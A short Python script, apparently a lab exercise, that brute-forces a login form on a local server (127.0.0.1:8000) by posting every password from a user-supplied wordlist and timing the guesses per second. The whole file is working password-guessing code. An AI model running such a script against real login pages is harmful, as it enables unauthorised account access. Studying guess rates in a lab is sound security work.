import requests
import time

def send_requests(user, password):
    response = requests.post('http://127.0.0.1:8000/login', data={'uname':user, 'pword':password})
    if response.url == 'http://127.0.0.1:8000/index.html':
        return True
    else:
        return False

def ask_for_username():
    user = input("First, please enter the username: \n").strip()
    return user

def read_file():
    file_name = input("Second, please enter the txt file name: \n")
    with open(file_name, encoding = 'koi8_u') as f:
        all_lines = f.readlines()
    return all_lines


def find_password():
    user = ask_for_username()
    all_lines = read_file()
    count = 0
    for line in all_lines:
        pword = line.strip()
        count += 1
        # print("current password testing is " + pword)
        if (send_requests(user, pword) == True):
            return pword, count
    return None, count

def main_program():
    start = time.time()
    password, count = find_password()
    end = time.time()
    time_lapsed = end - start
    time_lapsed = round(time_lapsed, 2)
    guess_per_second = round(count/time_lapsed, 2)
    print("time lapsed is " + str(time_lapsed) + " seconds.")
    print("average guess per second is " + str(guess_per_second))
    if password != None:
        print("We found the password which is " + password.strip())
    else:
        print("we did not find anything.")

main_program()

